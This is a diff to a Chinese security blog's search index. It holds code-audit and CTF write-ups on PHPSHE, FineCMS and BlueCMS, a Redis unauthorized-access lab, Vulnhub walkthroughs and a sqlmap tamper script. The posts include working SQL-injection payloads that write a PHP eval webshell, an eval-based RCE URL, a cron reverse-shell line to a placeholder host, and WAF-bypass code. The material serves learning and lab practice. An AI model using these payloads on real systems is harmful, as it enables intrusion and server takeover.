@@ -1,9 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[PHPSHE1.5漏洞分析]]></title>
+    <url>%2F2018%2F10%2F05%2FPHPSHE1-5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析 0x01 后台登陆逻辑漏洞漏洞描述后台登陆处无视验证码，可以进行爆破 漏洞利用密码输入错误时跳转到登陆界面 密码输入正确跳转的链接 可以根据返回内容不同进行爆破找到密码 漏洞分析代码位于/module/admin/do.php 123456789101112131415161718if (isset($_p_pesubmit)) &#123; $sql_set['admin_name'] = $_p_admin_name; $sql_set['admin_pw'] = md5($_p_admin_pw); if ($info = $db-&gt;pe_select('admin', pe_dbhold($sql_set))) &#123; strtolower($_s_authcode) != strtolower($_p_authcode) &amp;&amp; pe_error('验证码错误...'); $db-&gt;pe_update('admin', array('admin_id'=&gt;$info['admin_id']), array('admin_ltime'=&gt;time())); $_SESSION['admin_idtoken'] = md5($info['admin_id'].$pe['host_root']); $_SESSION['admin_id'] = $info['admin_id']; $_SESSION['admin_name'] = $info['admin_name']; $_SESSION['pe_token'] = pe_token_set($_SESSION['admin_idtoken']); pe_success('登录成功！', 'admin.php'); &#125; else &#123; pe_error('用户名或密码错误...'); &#125; &#125; $seo = pe_seo('管理员登录', '', '', 'admin'); include(pe_tpl('do_login.html')); 可以看到，这个登陆逻辑是先判断账号密码是否正确，之后再判断验证码是否正确 0x02 后台SQL注入漏洞描述在传递某些参数时未经过过滤，导致SQL注入 漏洞利用0x01 admin.php?mod=user1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 可以看到，注入成功，并且爆出了绝对路径 写入一句话 1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20'&lt;?php @eval($_POST[a])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile "D:\\wamp64\\www\\phpshe1.5\\shell.php"%23 可以看到一句话已经写入 使用菜刀连接 0x02 admin.php?mod=user&amp;act=email1http://localhost/phpshe1.5/admin.php?mod=user&amp;act=email&amp;id=1') union select * from ((select user())A join (select user())b join (select user())c join (select user())d join (select user())e join (select user())f join (select user())g join (select user())h join (select user())i join (select user())j join (select user())k join (select user())l join (select user())m join (select user())n join (select user())o join (select user())p join (select user())q join (select user())r )# 利用成功 除了payload不一样外其余操作与上一个漏洞基本一样 漏洞分析0x01代码位于/module/admin/user.php 1234567891011121314151617$_g_name &amp;&amp; $sqlwhere .= " and `user_name` like '%&#123;$_g_name&#125;%'"; $_g_phone &amp;&amp; $sqlwhere .= " and `user_phone` like '%&#123;$_g_phone&#125;%'"; $_g_email &amp;&amp; $sqlwhere .= " and `user_email` like '%&#123;$_g_email&#125;%'"; if (in_array($_g_orderby, array('ltime|desc', 'point|desc', 'ordernum|desc'))) &#123; $orderby = explode('|', $_g_orderby); $sqlwhere .= " order by `user_&#123;$orderby[0]&#125;` &#123;$orderby[1]&#125;"; &#125; else &#123; $sqlwhere .= " order by `user_id` desc"; &#125; $info_list = $db-&gt;pe_selectall('user', $sqlwhere, '*', array(20, $_g_page)); $tongji['user'] = $db-&gt;pe_num('user'); $tongji['useraddr'] = $db-&gt;pe_num('useraddr'); $tongji['userbank'] = $db-&gt;pe_num('userbank'); $seo = pe_seo($menutitle='会员列表', '', '', 'admin'); include(pe_tpl('user_list.html')); $_g_name是定义在common.php文件中 12345678if (get_magic_quotes_gpc()) &#123; !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, '_g'); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, '_p');&#125;else &#123; !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,'_g'); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,'_p');&#125; extract将GET与POST的参数加上_g_并成为变量,并未做防范sql注入的过滤 所以构造payload： 1mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 即可 0x02代码同样位于/module/admin/user.php 12345678910111213141516171819202122232425262728case 'email': if (isset($_p_pesubmit)) &#123; pe_token_match(); !$_p_email_user &amp;&amp; pe_error('收件人必须填写...'); !$_p_email_name &amp;&amp; pe_error('邮件标题必须填写...'); !$_p_email_text &amp;&amp; pe_error('邮件内容必须填写...'); $email_user = explode(',', $_p_email_user); foreach ($email_user as $k=&gt;$v) &#123; if (!$v) continue; $noticelog_list[$k]['noticelog_user'] = pe_dbhold($v); $noticelog_list[$k]['noticelog_name'] = pe_dbhold($_p_email_name); $noticelog_list[$k]['noticelog_text'] = $_p_email_text; $noticelog_list[$k]['noticelog_atime'] = time(); &#125; if ($db-&gt;pe_insert('noticelog', $noticelog_list)) &#123; pe_success('发送成功!', '', 'dialog'); &#125; else &#123; pe_error('发送失败...'); &#125; &#125; $info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); $email_user = array(); foreach ($info_list as $v) &#123; $v['user_email'] &amp;&amp; $email_user[] = $v['user_email']; &#125; $seo = pe_seo($menutitle='发送邮件', '', '', 'admin'); include(pe_tpl('user_email.html')); 其中 1$info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); 的$_g_id直接GET到后未进行过滤，不过有一个explode函数使得union select不太好使了，恰巧有个不用逗号的方法 1union select * from ((select user())A join (select user())b join (select user())c) 附上一段构造payload的python代码 123456789101112131415#coding=utf-8#union select * from ((select 1)A join (select 2)B join (select 3)C);#Max length 26import stringdic = string.ascii_lettersdef print_payload(col_length,content): payload = "union select * from ((select &#123;0&#125;)A ".format(content) for i in range(col_length-1): payload += "join (select &#123;0&#125;)&#123;1&#125; ".format(content,dic[i+1]) payload += ")" print(payload)print_payload(18,"user()") 0x03 总结果然爆破才是最强的]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Vulnhub JJS-CTF]]></title>
     <url>%2F2018%2F10%2F04%2FVulnhub-JJS-CTF%2F</url>
     <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
@@ -13,24 +28,33 @@
     <title><![CDATA[finecms免费版漏洞分析]]></title>
     <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[BlueCMS 代码审计]]></title>
     <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
     <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[redis未授权访问]]></title>
     <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
     <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
       <tags>
         <tag>Web</tag>
         <tag>redis</tag>
@@ -40,6 +64,9 @@
     <title><![CDATA[Vulnhub FristiLeaks]]></title>
     <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
     <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
@@ -49,6 +76,9 @@
     <title><![CDATA[sqlmap --tamper脚本编写]]></title>
     <url>%2F2018%2F10%2F01%2Fsqlmap-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%2F</url>
     <content type="text"><![CDATA[工欲善其事,必先利其器 0x01 tamper脚本在没有WAF的情况下使用Sqlmap注入网站基本上是无往不利，但是WAF的存在使得注入变得艰难，而tamper脚本可以在大多数情况下完成自动化注入 0x02 tamper脚本分析本文仅选择lowercase.py进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import refrom lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kbfrom lib.core.enums import PRIORITY#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py__priority__ = PRIORITY.NORMAL#定义优先级为一般def dependencies(): passdef tamper(payload, **kwargs):#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;'a': 1, 'c': 3, 'b': 2&#125; """ Replaces each keyword character with lower case value Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions &gt;&gt;&gt; tamper('INSERT') 'insert' """ retVal = payload if payload: for match in re.finditer(r"\b[A-Za-z_]+\b", retVal): word = match.group()#循环遍历每个单词 if word.upper() in kb.keywords:#如果是SQL中的关键词则替换为小写 retVal = retVal.replace(word, word.lower()) return retVal#返回替换后的payload 0x03 编写tamper脚本sqli-labs第36关 Bypass MYSQL_real_escape_string,绕过mysql_real_escape_string的方法本文不再累述,编写一个tamper脚本，使得payload中第一个单引号前加上%df 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python#coding:utf-8"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): """ Tested against: * MySQL * gbk,mysql_real_escape_string &gt;&gt;&gt; tamper('1' and sleep(10) ') '1%df' and sleep(10)' """ retVal = "" if payload: first = False for i in payload: if i == '\'' and not first: retVal += '%df\'' first = True else: retVal += i return retVal 0x04 使用tamper脚本测试下脚本是否给力 1python2 .\sqlmap.py -u "http://localhost/sqli-labs/Less-36/?id=1" --tamper=gbk.py --dbs]]></content>
+      <categories>
+        <category>Code</category>
+      </categories>
       <tags>
         <tag>Web</tag>
         <tag>sqlmap</tag>
